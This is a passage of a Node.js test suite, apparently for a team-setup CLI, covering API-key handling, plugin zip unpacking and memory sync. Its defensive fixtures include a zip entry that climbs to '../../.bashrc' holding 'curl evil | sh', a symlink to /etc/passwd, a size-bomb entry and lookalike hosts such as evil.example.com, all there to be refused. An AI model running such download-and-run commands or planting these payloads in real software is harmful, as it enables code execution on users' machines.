// Binds test/features/team-setup.feature (ADR-217 with Amendments 1 and 2, ids TSU-M-nn).
// Gate 3 of ADR-201: every scenario is @proposed. node:test has no expected
// failure, so the state tag is held to the binding instead: a @proposed
// scenario must have no test here, and a @built one must have one. The pull
// request that builds a scenario adds `scenario(id, fn)` below and flips its
// tag to @built in the same change, or this file fails.
import test from "node:test";
import assert from "node:assert/strict";
import { execFile, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync } from "node:fs";
import { chmod, mkdir, mkdtemp, readdir, readFile, rm, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { delimiter, dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { crc32, deflateRawSync } from "node:zlib";
import { SystemDoxApiClient, SystemDoxApiError } from "../dist/lib/api-client.js";
import { runSyncMemory, syncMemory } from "../dist/sync-memory.js";
import { parseSetupArgs, runTeamSetup, setJsonMember, withImportBlock } from "../dist/setup-team.js";
import { setupMcpServer } from "../dist/setup-mcp.js";
import { findPersonValues, findSecrets, normalise, rewriteHomePaths } from "../dist/lib/person-values.js";
import {
  apiKeyFor,
  credentialsPath,
  loadLocalConfig,
  marketplaceWorkspace,
  pluginDir,
  readState,
  runMarketplaceAuth,
  statePath,
  writeCredentials,
  writeState,
} from "../dist/lib/team-setup-files.js";
import { MAX_UNPACKED_BYTES, runPluginPath } from "../dist/plugin-path.js";
import { registerTeamSetupTools } from "../dist/tools/team-setup.js";

const FEATURE = join(dirname(fileURLToPath(import.meta.url)), "features", "team-setup.feature");

// [{ id, title, tags }] in file order: the tags are the @-lines just above the Scenario line.
function readScenarios(text) {
  const found = [];
  let tags = [];
  for (const raw of text.split(/\r?\n/)) {
    const line = raw.trim();
    if (line.startsWith("@")) {
      tags.push(...line.split(/\s+/));
      continue;
    }
    const m = line.match(/^Scenario: (TSU-M-\d+) (.+)$/);
    if (m) found.push({ id: m[1], title: m[2].trim(), tags });
    if (line && !line.startsWith("#")) tags = [];
  }
  return found;
}

const SCENARIOS = readScenarios(await readFile(FEATURE, "utf8"));
const TITLES = new Map(SCENARIOS.map((s) => [s.id, s.title]));
const bound = new Set();
function scenario(id, fn) {
  assert.ok(TITLES.has(id), `${id} is not a scenario in the feature file`);
  bound.add(id);
  test(`${id} ${TITLES.get(id)}`, fn);
}

// A scenario proved by hand on a member's computer (TSU-M-30 to 32, proposal
// item 20) is bound to its record: scenario("TSU-M-30", evidence("TSU-M-30")).
// The record is test/evidence/team-setup/<id>.md: `field: value` lines between
// two `---` lines, then what was done and seen.
const EVIDENCE = join(dirname(fileURLToPath(import.meta.url)), "evidence", "team-setup");
const EVIDENCE_FIELDS = {
  scenario: (v, id) => v === id,
  result: (v) => v === "passed",
  provedAt: (v) => /^\d{4}-\d{2}-\d{2}$/.test(v),
  claudeCode: (v) => /^\d+\.\d+\.\d+$/.test(v),
  environment: (v) => v === "preprod",
  terminal: (v) => v.length > 0,
};
function checkEvidence(id, text) {
  const m = text.match(/^---\r?\n([\s\S]*?)\r?\n---\r?\n([\s\S]*)$/);
  assert.ok(m, `${id}: the record needs a header between two --- lines`);
  const fields = {};
  for (const line of m[1].split(/\r?\n/)) {
    const at = line.indexOf(":");
    if (at > 0) fields[line.slice(0, at).trim()] = line.slice(at + 1).trim();
  }
  for (const [field, ok] of Object.entries(EVIDENCE_FIELDS)) {
    assert.ok(field in fields && ok(fields[field], id), `${id}: the record's ${field} is missing or wrong (${fields[field] ?? "none"})`);
  }
  assert.ok(m[2].trim().length > 0, `${id}: the record says nothing of what was done and seen`);
}
function evidence(id) {
  return async () => checkEvidence(id, await readFile(join(EVIDENCE, `${id}.md`), "utf8"));
}

// Build PRs bind scenarios here, e.g. scenario("TSU-M-11", async () => { … });

// ── Shared fixtures: a temporary HOME, a fake API, zips made here ───────────
// Offline: the file system is a temporary HOME (never the real ~/.claude), the
// HTTP edge is a fake client (as test/skills.test.mjs fakes it) or a stubbed
// fetch, and every zip is built byte by byte below.

const HERE = dirname(fileURLToPath(import.meta.url));
const CLI = join(HERE, "..", "dist", "cli.js");
const API = "https://api.puglieseweb.com/systemdox"; // the default SYSTEMDOX_API_URL
const MARKETPLACE = (ws, api = API) => `${api}/v1/team-setup/${ws}/marketplace.json`;
const KEY_ACME = "acme-member-" + "key-0001"; // not key-shaped: the org secret scan reads added lines
const KEY_OTHER = "other-member-" + "key-0002";
const PERSON_ID = "con_" + "01JC2Q8Y4M7T0X3K5N9P2R6S8V";
const sha = (bytes) => createHash("sha256").update(bytes).digest("hex");
const run = promisify(execFile);

/** Run `fn(home)` with HOME (and USERPROFILE, which Windows reads) pointed at
 * an empty temporary folder, no SYSTEMDOX_API_KEY, and fetch counted. */
async function withHome(fn) {
  const home = await mkdtemp(join(tmpdir(), "sdx-team-"));
  const saved = {
    HOME: process.env.HOME,
    USERPROFILE: process.env.USERPROFILE,
    SYSTEMDOX_API_KEY: process.env.SYSTEMDOX_API_KEY,
    SYSTEMDOX_API_URL: process.env.SYSTEMDOX_API_URL,
  };
  const realFetch = globalThis.fetch;
  const network = [];
  globalThis.fetch = async (url) => {
    network.push(String(url));
    throw new Error(`unexpected network call to ${url}`);
  };
  process.env.HOME = home;
  process.env.USERPROFILE = home;
  delete process.env.SYSTEMDOX_API_KEY;
  delete process.env.SYSTEMDOX_API_URL;
  try {
    await fn(home, network);
  } finally {
    globalThis.fetch = realFetch;
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    await rm(home, { recursive: true, force: true });
  }
}

/** Every file under `dir` with its bytes' hash: what "nothing written" compares. */
async function tree(dir) {
  const out = {};
  async function walk(d) {
    for (const e of await readdir(d, { withFileTypes: true })) {
      const full = join(d, e.name);
      if (e.isDirectory()) await walk(full);
      else out[full.slice(dir.length + 1).replaceAll("\\", "/")] = sha(await readFile(full));
    }
  }
  if (existsSync(dir)) await walk(dir);
  return out;
}

function io() {
  const lines = { out: [], err: [] };
  return { lines, out: (l) => lines.out.push(l), err: (l) => lines.err.push(l) };
}

/** A zip of `entries` ({ name, data, mode, deflate, size }), made as
 * plugin_builder.py makes one: Unix entries, UTF-8 names. `mode` is the
 * entry's st_mode (0o100644 a file, 0o120777 a link); `size` overrides the
 * declared unpacked size. */
function makeZip(entries) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, "utf8");
    const data = Buffer.isBuffer(e.data) ? e.data : Buffer.from(e.data ?? "", "utf8");
    const body = e.deflate ? deflateRawSync(data) : data;
    const method = e.deflate ? 8 : 0;
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0x800, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt16LE(0x21, 12);
    local.writeUInt32LE(crc32(data), 14);
    local.writeUInt32LE(body.length, 18);
    local.writeUInt32LE(e.size ?? data.length, 22);
    local.writeUInt16LE(name.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE((3 << 8) | 20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0x800, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt16LE(0x21, 14);
    central.writeUInt32LE(crc32(data), 16);
    central.writeUInt32LE(body.length, 20);
    central.writeUInt32LE(e.size ?? data.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(((e.mode ?? 0o100644) << 16) >>> 0, 38);
    central.writeUInt32LE(offset, 42);
    locals.push(local, name, body);
    centrals.push(central, name);
    offset += 30 + name.length + body.length;
  }
  const cd = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cd.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, end]);
}

const PLUGIN_ENTRIES = [
  { name: ".claude-plugin/plugin.json", data: '{\n  "name": "acme-setup",\n  "version": "4.0.0"\n}\n', deflate: true },
  { name: "hooks/hooks.json", data: '{"hooks": {}}\n', deflate: true },
  { name: "scripts/check.sh", data: "#!/bin/sh\necho ok\n", mode: 0o100755, deflate: true },
  { name: "skills/landing-review/SKILL.md", data: "---\nname: landing-review\n---\n" },
];

/** A fake API client that serves `zip` and counts the downloads. */
function zipClient(zip) {
  const calls = [];
  return {
    calls,
    getPluginZip: async (workspace, version) => {
      calls.push([workspace, version]);
      return { bytes: zip, sha256: sha(zip) };
    },
  };
}

/** The MCP tools against a fake API (the server object only captures handlers). */
function tools({ localFiles, publish, person } = {}) {
  const registered = {};
  const calls = { own: 0, published: [], resolved: [] };
  const client = {
    getOwnTeamSetup: async () => {
      calls.own++;
      return { workspace: "acme" };
    },
    publishPartVersion: async (workspace, part, files) => {
      calls.published.push({ workspace, part, files });
      if (publish instanceof Error) throw publish;
      return publish ?? { part, version: 3, publishedAt: "2026-11-01T18:00:00Z", publishedBy: "usr_x", files: [], pluginVersion: 7 };
    },
    resolvePerson: async (workspace, id) => {
      calls.resolved.push({ workspace, id });
      if (person instanceof Error) throw person;
      return person;
    },
  };
  registerTeamSetupTools({ registerTool: (name, meta, fn) => (registered[name] = { meta, fn }) }, client, { localFiles });
  return { registered, calls };
}

// ── A fake team memory: the routes of openapi.yaml, kept in memory ──────────
// The server's own checks are mirrored where a scenario leans on them: a stale
// base answers 409 SYD-K010 with currentVersion, a blob holding a person's
// details not answered `ours` (or a home path) is refused SYD-K014, a `member`
// answer with no match is refused SYD-K021, and Contacts down answers 503
// SYD-K019.

const PROJECT = "notes";
const TODAY = () => new Date(2026, 10, 1, 12, 0, 0);
const apiError = (status, code, extra = {}) =>
  new SystemDoxApiError(status, JSON.stringify({ code, detail: `${code}: refused`, ...extra }));
const valueKey = (kind, value) => `${kind}:${normalise(kind, value)}`;

function fakeTeam({ files, answered = {}, members = {}, contactsDown = false } = {}) {
  const blobs = new Map();
  const versions = [];
  const answers = new Map(Object.entries(answered));
  const calls = [];
  let beforePush;
  const store = (content) => {
    const h = sha(Buffer.from(content, "utf8"));
    blobs.set(h, content);
    return h;
  };
  const commit = (contents) => {
    const manifest = Object.fromEntries(Object.entries(contents).map(([p, c]) => [p, store(c)]));
    versions.push({ version: versions.length + 1, manifest });
    return versions.length;
  };
  if (files) commit(files);
  const latest = () => versions.at(-1);
  const client = {
    getOwnTeamSetup: async () => {
      calls.push(["getOwnTeamSetup"]);
      return { workspace: "acme", memory: versions.length ? [{ project: PROJECT, latestVersion: latest().version }] : [] };
    },
    getMemory: async (ws, project) => {
      calls.push(["getMemory", project]);
      if (!versions.length) throw apiError(404, "SYD-K016");
      const v = latest();
      return {
        project,
        version: v.version,
        createdAt: "2026-11-01T12:00:00Z",
        files: Object.fromEntries(Object.entries(v.manifest).map(([p, h]) => [p, { sha256: h, bytes: 1, syncedBy: "usr_x", syncedAt: "2026-11-01T12:00:00Z" }])),
      };
    },
    readBlobs: async (ws, project, hashes) => {
      calls.push(["readBlobs", hashes.length]);
      return { blobs: hashes.map((h) => ({ sha256: h, content: blobs.get(h) })), remaining: [] };
    },
    findMissingBlobs: async (ws, project, hashes) => {
      calls.push(["findMissingBlobs", hashes.length]);
      return { missing: hashes.filter((h) => !blobs.has(h)) };
    },
    uploadBlobs: async (ws, project, sent) => {
      calls.push(["uploadBlobs", sent.map((b) => b.content)]);
      const stored = [];
      const refused = [];
      for (const b of sent) {
        const people = findPersonValues(b.content).filter((f) => f.kind === "home-path" || answers.get(valueKey(f.kind, f.value))?.answer !== "ours");
        if (findSecrets(b.content).length) refused.push({ sha256: b.sha256, code: "SYD-K005", detail: "SYD-K005: a secret" });
        else if (people.length) {
          refused.push({ sha256: b.sha256, code: "SYD-K014", detail: "SYD-K014: a person's details", personalData: people.map((f) => ({ kind: f.kind, line: f.line })) });
        } else stored.push(store(b.content));
      }
      return { stored, refused };
    },
    pushMemoryVersion: async (ws, project, { baseVersion, manifest }) => {
      calls.push(["pushMemoryVersion", baseVersion]);
      if (beforePush) await beforePush();
      const current = versions.length ? latest().version : 0;
      if (baseVersion !== current) throw apiError(409, "SYD-K010", { currentVersion: current });
      for (const h of Object.values(manifest)) assert.ok(blobs.has(h), "every hash pushed is stored");
      versions.push({ version: current + 1, manifest: { ...manifest } });
      return { project, version: current + 1, createdAt: "2026-11-01T12:00:00Z", files: {} };
    },
    lookupValues: async (ws, values) => {
      calls.push(["lookupValues", values.length]);
      return { answers: values.map((v) => ({ ...v, ...(answers.get(valueKey(v.kind, v.value)) ?? { answer: "unanswered" }) })) };
    },
    answerValues: async (ws, sent) => {
      calls.push(["answerValues", sent.map((a) => a.answer)]);
      const stored = [];
      const refused = [];
      sent.forEach((a, index) => {
        const key = valueKey(a.kind, a.value);
        if (a.answer === "member" && !members[key]) {
          refused.push({ index, code: "SYD-K021", detail: `SYD-K021: answer ${index}: no Staff contact or member of the organisation has this ${a.kind}` });
          return;
        }
        const answer = { answer: a.answer, ...(a.answer === "member" ? { personId: members[key] } : {}), ...(a.label ? { label: a.label } : {}) };
        answers.set(key, answer);
        stored.push({ kind: a.kind, value: a.value, ...answer });
      });
      return { stored, refused };
    },
    fileMemoryPeople: async (ws, people) => {
      calls.push(["fileMemoryPeople", people.length]);
      if (contactsDown) throw apiError(503, "SYD-K019");
      const stored = [];
      for (const p of people) {
        for (const v of p.values) {
          const answer = { answer: "person", personId: PERSON_ID, label: p.label };
          answers.set(valueKey(v.kind, v.value), answer);
          stored.push({ ...v, ...answer });
        }
      }
      return { stored, refused: [] };
    },
  };
  return {
    client,
    calls,
    commit,
    /** The latest version's files with their text. */
    latest: () => (versions.length ? Object.fromEntries(Object.entries(latest().manifest).map(([p, h]) => [p, blobs.get(h)])) : {}),
    version: () => (versions.length ? latest().version : 0),
    named: (name) => calls.filter((c) => c[0] === name),
    uploaded: () => calls.filter((c) => c[0] === "uploadBlobs").flatMap((c) => c[1]),
    onPush: (fn) => (beforePush = fn),
  };
}

/** A memory file of `type`. */
const mem = (type, body, extra = "") => `---\nname: ${type} note\ndescription: a note\ntype: ${type}\n${extra}---\n\n${body}\n`;
const memoryDir = (home) => join(home, ".claude", "systemdox", "acme", "memory", PROJECT);

/** The member's answers at the terminal, in order; every question is kept. */
function terminal(...answers) {
  const asked = [];
  const ask = async (question) => {
    asked.push(question);
    assert.ok(answers.length, `asked more than expected: ${question}`);
    return answers.shift();
  };
  return { ask, asked };
}

/** Run the sync as the member does (in-process), with the report captured. */
async function sync(team, options = {}) {
  const lines = [];
  const code = await syncMemory({ project: PROJECT, dryRun: false, client: team.client, out: (...l) => lines.push(...l), now: TODAY, ...options });
  return { code, text: lines.join("\n") };
}

/** Write `files` into `dir`, and record them as the base of the last sync at `version`. */
async function lastSynced(dir, files, version) {
  for (const [path, content] of Object.entries(files)) await write(dir, path, content);
  await writeState("acme", {
    memory: { [PROJECT]: { version, manifest: Object.fromEntries(Object.entries(files).map(([p, c]) => [p, sha(Buffer.from(c, "utf8"))])) } },
  });
}

/** Every file under `dir` with its text. */
async function texts(dir) {
  const out = {};
  for (const path of Object.keys(await tree(dir))) out[path] = await readFile(join(dir, ...path.split("/")), "utf8");
  return out;
}

const PHONE = "07700 900456";
const ORG_LINE = "020 7946 0321";
const EMAIL = "jo.bloggs@example.com";

async function write(root, path, content) {
  await mkdir(dirname(join(root, path)), { recursive: true });
  await writeFile(join(root, path), content);
}

// ── marketplace-auth ─────────────────────────────────────────────────────────

scenario("TSU-M-07", () =>
  withHome(async (home, network) => {
    await writeCredentials("acme", KEY_ACME);
    await writeCredentials("other", KEY_OTHER);
    const before = await tree(home);
    const ask = async (url, env = {}) => {
      const r = io();
      const code = await runMarketplaceAuth(r, { CLAUDE_CODE_MARKETPLACE_URL: url, ...env });
      return { code, ...r.lines };
    };

    // Another host, or anything that is not a SystemDox team marketplace: no key.
    for (const url of [
      "https://evil.example.com/systemdox/v1/team-setup/acme/marketplace.json",
      "https://api.puglieseweb.com.evil.example/systemdox/v1/team-setup/acme/marketplace.json",
      "http://api.puglieseweb.com/systemdox/v1/team-setup/acme/marketplace.json",
      "https://api.puglieseweb.com:8443/systemdox/v1/team-setup/acme/marketplace.json",
      "https://api.puglieseweb.com/other/v1/team-setup/acme/marketplace.json",
      "https://api.puglieseweb.com/systemdox/v1/team-setup/acme/plugin/versions/4/zip",
      "https://api.puglieseweb.com/systemdox/v1/team-setup/ACME/marketplace.json",
      "not a url",
    ]) {
      const r = await ask(url);
      assert.equal(r.code, 1, url);
      assert.deepEqual(r.out, [], `${url}: nothing on stdout`);
      assert.ok(r.err.join("\n").includes(url), `${url}: named on stderr`);
      assert.ok(!r.err.join("\n").includes(KEY_ACME) && !r.err.join("\n").includes(KEY_OTHER));
    }
    // The host of SYSTEMDOX_API_URL is the one that counts, not the default's.
    const preprod = "https://api.preprod.example.org/systemdox";
    assert.equal((await ask(MARKETPLACE("acme"), { SYSTEMDOX_API_URL: preprod })).code, 1);
    assert.equal(marketplaceWorkspace(MARKETPLACE("acme", preprod), preprod), "acme");

    // Its own workspace on SystemDox: exactly the header, with that workspace's key.
    const acme = await ask(MARKETPLACE("acme"));
    assert.equal(acme.code, 0);
    assert.deepEqual(acme.out, [`{"Authorization":"Bearer ${KEY_ACME}"}`]);
    assert.deepEqual((await ask(MARKETPLACE("other"))).out, [`{"Authorization":"Bearer ${KEY_OTHER}"}`]);
    const none = await ask(MARKETPLACE("nobody"));
    assert.equal(none.code, 1);
    assert.deepEqual(none.out, []);
    // SYSTEMDOX_API_KEY comes first (contract.md, "The API key").
    assert.deepEqual((await ask(MARKETPLACE("acme"), { SYSTEMDOX_API_KEY: "from-env" })).out, [
      '{"Authorization":"Bearer from-env"}',
    ]);

    assert.deepEqual(network, [], "no network call");
    assert.deepEqual(await tree(home), before, "nothing written");

    // The command itself, as Claude Code runs it.
    const env = { ...process.env, HOME: home, USERPROFILE: home, SYSTEMDOX_API_KEY: "", SYSTEMDOX_API_URL: "" };
    const ok = await run(process.execPath, [CLI, "marketplace-auth"], {
      env: { ...env, CLAUDE_CODE_MARKETPLACE_URL: MARKETPLACE("acme") },
    });
    assert.equal(ok.stdout, `{"Authorization":"Bearer ${KEY_ACME}"}\n`);
    await assert.rejects(
      run(process.execPath, [CLI, "marketplace-auth"], {
        env: { ...env, CLAUDE_CODE_MARKETPLACE_URL: "https://evil.example.com/v1/team-setup/acme/marketplace.json" },
      }),
      (e) => e.code === 1 && e.stdout === "" && e.stderr.includes("evil.example.com")
    );
    assert.deepEqual(await tree(home), before, "nothing written by the command either");
  })
);

test("credentials.json: the key order, and the file is the member's alone", () =>
  withHome(async () => {
    assert.equal(await apiKeyFor("acme"), undefined);
    await writeCredentials("acme", KEY_ACME);
    await writeCredentials("other", KEY_OTHER);
    assert.deepEqual(JSON.parse(await readFile(credentialsPath(), "utf8")), {
      acme: { apiKey: KEY_ACME },
      other: { apiKey: KEY_OTHER },
    });
    assert.equal(await apiKeyFor("acme"), KEY_ACME);
    assert.equal(await apiKeyFor("acme", { SYSTEMDOX_API_KEY: "from-env" }), "from-env");
    if (process.platform === "win32") {
      const { stdout } = await run("icacls", [credentialsPath()]);
      assert.ok(!/Everyone|BUILTIN\\Users|Authenticated Users|\(I\)/.test(stdout), stdout);
    } else {
      assert.equal((await stat(credentialsPath())).mode & 0o777, 0o600);
    }
    await assert.rejects(writeCredentials("../x", KEY_ACME), /not a workspace name/);
  })
);

// ── plugin-path ──────────────────────────────────────────────────────────────

scenario("TSU-M-08", () =>
  withHome(async (home, network) => {
    const zip = makeZip(PLUGIN_ENTRIES);
    const folder = pluginDir("acme", 3);
    await write(folder, ".claude-plugin/plugin.json", "{}");
    await writeState("acme", { plugin: { 3: { sha256: sha(zip), installedAt: "2026-11-01T18:00:00Z" } } });
    const before = await tree(home);

    // No client and no key at all: nothing is needed to print a recorded version.
    const r = io();
    assert.equal(await runPluginPath(["acme", "--version", "3", "--sha256", sha(zip)], r), 0);
    assert.deepEqual(r.lines.out, [folder]);
    assert.deepEqual(network, [], "no network call");
    assert.deepEqual(await tree(home), before, "nothing written");

    // The same, through the command Claude Code runs.
    const { stdout } = await run(process.execPath, [CLI, "plugin-path", "acme", "--version", "3", "--sha256", sha(zip)], {
      env: { ...process.env, HOME: home, USERPROFILE: home, SYSTEMDOX_API_KEY: "", SYSTEMDOX_API_URL: "https://127.0.0.1:9" },
    });
    assert.equal(stdout, `${folder}\n`);
  })
);

test("plugin-path downloads a version not on the computer, unpacks it beside the others and records its hash", () =>
  withHome(async (home, network) => {
    const zip = makeZip(PLUGIN_ENTRIES);
    const client = zipClient(zip);
    const r = io();
    assert.equal(await runPluginPath(["acme", "--version", "4", "--sha256", sha(zip)], { ...r, client }), 0);
    const folder = pluginDir("acme", 4);
    assert.deepEqual(r.lines.out, [folder], "stdout carries only the folder");
    assert.deepEqual(client.calls, [["acme", 4]]);
    for (const e of PLUGIN_ENTRIES) assert.equal(await readFile(join(folder, ...e.name.split("/")), "utf8"), e.data);
    if (process.platform !== "win32") assert.equal((await stat(join(folder, "scripts", "check.sh"))).mode & 0o777, 0o755);
    assert.deepEqual(await readdir(dirname(folder)), ["4"], "no temporary folder left beside it");
    const state = await readState("acme");
    assert.equal(state.plugin["4"].sha256, sha(zip));
    assert.deepEqual(Object.keys(state), ["plugin"], "state.json holds no key, value or answer");

    // The next session is served from the disk.
    assert.equal(await runPluginPath(["acme", "--version", "4", "--sha256", sha(zip)], { ...io(), client }), 0);
    assert.equal(client.calls.length, 1);

    // Usage errors exit 1 and write nothing.
    for (const argv of [[], ["acme"], ["../x", "--version", "4", "--sha256", sha(zip)], ["acme", "--version", "x", "--sha256", sha(zip)], ["acme", "--version", "4", "--sha256", "abc"]]) {
      assert.equal(await runPluginPath(argv, { ...io(), client }), 1, argv.join(" "));
    }
    // No key: exit 1, nothing fetched.
    assert.equal(await runPluginPath(["acme", "--version", "5", "--sha256", sha(zip)], io()), 1);
    assert.deepEqual(network, []);
    assert.ok(existsSync(join(home, ".claude", "systemdox", "acme", "state.json")));
  })
);

test("the API client downloads the zip as bytes, asking for application/zip with the key", async () => {
  const realFetch = globalThis.fetch;
  const zip = makeZip(PLUGIN_ENTRIES);
  const seen = [];
  globalThis.fetch = async (url, init) => {
    seen.push({ url: String(url), headers: init.headers });
    return new Response(zip, { status: 200, headers: { "Content-Type": "application/zip", "X-Content-SHA256": sha(zip) } });
  };
  try {
    const client = new SystemDoxApiClient({ apiKey: KEY_ACME, apiUrl: API, cacheTtlMs: 0, defaultOrg: undefined });
    const got = await client.getPluginZip("acme", 4);
    assert.ok(Buffer.from(got.bytes).equals(zip));
    assert.equal(got.sha256, sha(zip));
    assert.equal(seen[0].url, `${API}/v1/team-setup/acme/plugin/versions/4/zip`);
    assert.equal(seen[0].headers.Accept, "application/zip");
    assert.equal(seen[0].headers.Authorization, `Bearer ${KEY_ACME}`);

    globalThis.fetch = async () =>
      new Response(JSON.stringify({ code: "SYD-K016", detail: "SYD-K016: no such version" }), { status: 404 });
    await assert.rejects(client.getPluginZip("acme", 9), (e) => e.status === 404 && e.code === "SYD-K016" && /SYD-K016/.test(e.message));
  } finally {
    globalThis.fetch = realFetch;
  }
});

scenario("TSU-M-09", () =>
  withHome(async () => {
    const zip = makeZip(PLUGIN_ENTRIES);
    const named = sha(Buffer.from("the zip Claude Code was told about"));
    const r = io();
    assert.equal(await runPluginPath(["acme", "--version", "4", "--sha256", named], { ...r, client: zipClient(zip) }), 2);
    assert.deepEqual(r.lines.out, []);
    assert.match(r.lines.err.join("\n"), new RegExp(`SHA-256 ${sha(zip)}, not the ${named}`));
    assert.match(r.lines.err.join("\n"), /Nothing was unpacked/);
    const root = dirname(pluginDir("acme", 4));
    assert.ok(!existsSync(root) || (await readdir(root)).length === 0, "nothing unpacked");
    assert.equal((await readState("acme")).plugin, undefined, "no hash recorded");
  })
);

scenario("TSU-M-10", () =>
  withHome(async (home) => {
    const big = Buffer.alloc(MAX_UNPACKED_BYTES + 1);
    const cases = [
      ["../../.bashrc", { name: "../../.bashrc", data: "curl evil | sh\n" }, /climbs out/],
      ["/etc/profile.d/x.sh", { name: "/etc/profile.d/x.sh", data: "x\n" }, /is absolute/],
      ["C:/Users/x/evil.ps1", { name: "C:/Users/x/evil.ps1", data: "x\n" }, /is absolute/],
      ["scripts/link", { name: "scripts/link", data: "/etc/passwd", mode: 0o120777 }, /is a link/],
      ["skills/huge/blob.md", { name: "skills/huge/blob.md", data: big, deflate: true }, /unpacked size past 20971520 bytes/],
      // A size declared small that inflates larger is caught as it unpacks.
      ["skills/lies/blob.md", { name: "skills/lies/blob.md", data: big, deflate: true, size: 10 }, /size other than|cannot be unpacked/],
    ];
    for (const [name, entry, why] of cases) {
      const zip = makeZip([PLUGIN_ENTRIES[0], entry, PLUGIN_ENTRIES[1]]);
      const r = io();
      assert.equal(await runPluginPath(["acme", "--version", "4", "--sha256", sha(zip)], { ...r, client: zipClient(zip) }), 2, name);
      assert.deepEqual(r.lines.out, [], name);
      const err = r.lines.err.join("\n");
      assert.ok(err.includes(JSON.stringify(name)), `${name} is named: ${err}`);
      assert.match(err, why, name);
      const root = dirname(pluginDir("acme", 4));
      assert.ok(!existsSync(root) || (await readdir(root)).length === 0, `${name}: nothing unpacked`);
    }
    assert.ok(!existsSync(join(home, ".bashrc")));
    assert.ok(!existsSync(join(home, ".claude", ".bashrc")));
    assert.ok(!existsSync(join(home, ".claude", "systemdox", ".bashrc")));
    assert.equal((await readState("acme")).plugin, undefined);
  })
);

// ── sync-memory: the merge ───────────────────────────────────────────────────

scenario("TSU-M-11", () =>
  withHome(async (home, network) => {
    const v1 = { "a.md": mem("project", "A, as last synced"), "b.md": mem("feedback", "B, as last synced") };
    const team = fakeTeam({ files: v1 });
    const dir = memoryDir(home);
    await lastSynced(dir, v1, 1);
    await write(dir, "a.md", mem("project", "A, changed here"));
    team.commit({ ...v1, "b.md": mem("feedback", "B, changed by the team") });

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    assert.equal(team.latest()["a.md"], mem("project", "A, changed here"), "the team has the member's a.md");
    assert.equal(await readFile(join(dir, "b.md"), "utf8"), mem("feedback", "B, changed by the team"), "the member has the team's b.md");
    assert.match(text, /^Synced acme\/notes at version 3: 1 pulled, 1 pushed, 0 deleted, 0 conflicts, 0 skipped\.$/m);
    assert.match(text, /\nPulled:\n- b\.md\n/);
    assert.match(text, /\nPushed:\n- a\.md/);
    assert.deepEqual(team.named("pushMemoryVersion"), [["pushMemoryVersion", 2]], "pushed on the team's version");
    const state = await readState("acme");
    assert.equal(state.memory[PROJECT].version, 3, "state.json takes the new base");
    assert.equal(state.memory[PROJECT].manifest["a.md"], sha(mem("project", "A, changed here")));
    assert.deepEqual(network, []);
  })
);

scenario("TSU-M-12", () =>
  withHome(async (home) => {
    const v1 = { "a.md": mem("project", "A, as last synced") };
    const team = fakeTeam({ files: v1 });
    const dir = memoryDir(home);
    await lastSynced(dir, v1, 1);
    await write(dir, "a.md", mem("project", "A, my text"));
    team.commit({ "a.md": mem("project", "A, the team's text") });

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    assert.equal(await readFile(join(dir, "a.md"), "utf8"), mem("project", "A, the team's text"), "a.md holds the team's text");
    assert.equal(await readFile(join(dir, "a.local-2026-11-01.md"), "utf8"), mem("project", "A, my text"), "the member's text is beside it");
    assert.match(text, /\nConflicts:\n- a\.md: the team's text; yours is beside it as a\.local-2026-11-01\.md/, "both are listed");
    assert.deepEqual(Object.keys(team.latest()), ["a.md"], "the conflict copy never goes up");
    assert.equal(team.version(), 2, "nothing new to push");

    // A second conflict the same day takes -2.
    await write(dir, "a.md", mem("project", "A, my second text"));
    team.commit({ "a.md": mem("project", "A, the team's second text") });
    await sync(team);
    assert.equal(await readFile(join(dir, "a.local-2026-11-01-2.md"), "utf8"), mem("project", "A, my second text"));
    assert.equal(await readFile(join(dir, "a.local-2026-11-01.md"), "utf8"), mem("project", "A, my text"), "the first copy is untouched");
  })
);

scenario("TSU-M-13", () =>
  withHome(async (home) => {
    const v1 = { "old.md": mem("reference", "Old"), "keep.md": mem("project", "Keep") };
    const team = fakeTeam({ files: v1 });
    const dir = memoryDir(home);
    await lastSynced(dir, v1, 1);
    team.commit({ "keep.md": mem("project", "Keep") });

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    assert.ok(!existsSync(join(dir, "old.md")), "old.md is gone here too");
    assert.ok(existsSync(join(dir, "keep.md")));
    assert.match(text, /\nDeleted:\n- old\.md \(here: the team deleted it\)/);
  })
);

scenario("TSU-M-14", () =>
  withHome(async (home) => {
    const index = "# Memory\n\n## Notes\n- [Alpha](alpha.md) — the first note\n\n## Other\n- [Gamma](gamma.md)\n";
    const v1 = { "MEMORY.md": index, "alpha.md": mem("project", "Alpha"), "gamma.md": mem("project", "Gamma") };
    const team = fakeTeam({ files: v1 });
    const dir = memoryDir(home);
    await lastSynced(dir, v1, 1);
    team.commit({
      ...v1,
      "MEMORY.md": index.replace("the first note\n", "the first note\n- [New](new.md) — the team's note\n"),
      "new.md": mem("project", "New"),
    });
    await write(dir, "MEMORY.md", index.replace("the first note\n", "the first note\n- [Mine](mine.md) — my note\n"));
    await write(dir, "mine.md", mem("project", "Mine"));

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    const merged = await readFile(join(dir, "MEMORY.md"), "utf8");
    const notes = merged.slice(merged.indexOf("## Notes"), merged.indexOf("## Other"));
    assert.ok(notes.includes("- [New](new.md) — the team's note"), merged);
    assert.ok(notes.includes("- [Mine](mine.md) — my note"), merged);
